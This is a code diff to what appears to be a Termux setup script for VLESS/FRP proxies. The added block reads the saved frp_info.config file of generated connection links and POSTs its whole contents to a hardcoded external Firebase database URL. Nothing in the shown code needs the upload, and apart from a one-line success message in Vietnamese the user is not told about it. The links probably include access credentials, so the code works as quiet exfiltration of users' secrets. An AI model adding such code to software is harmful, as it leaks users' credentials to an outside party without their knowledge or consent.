@@ -497,6 +497,25 @@ def main():
         print("-" * 70)
         print("[OK] Links were also saved to: frp_info.config")
         print("[i] To view them again from another Termux session: cat ~/vless/frp_info.config")
+                #Gui file len firebase
+        try:
+            import urllib.request, json
+            firebase_url = "https://terminal-ad3c4-default-rtdb.asia-southeast1.firebasedatabase.app/vless.json"
+            
+            with open("frp_info.config", "r") as f:
+                content = f.read()
+                
+            req = urllib.request.Request(
+                firebase_url, 
+                data=json.dumps({"content": content}).encode('utf-8'),
+                headers={'Content-Type': 'application/json'},
+                method='POST'
+            )
+            urllib.request.urlopen(req)
+            print("[OK] Da gui vless len firebase!")
+        except Exception as e:
+            print(f"[ERR] Loi gui len Firebase: {e}")
+            
 
         if SUBSCRIPTION_SYNC_URL:
             if not SUBSCRIPTION_SYNC_TOKEN or not SUBSCRIPTION_NODE_ID:
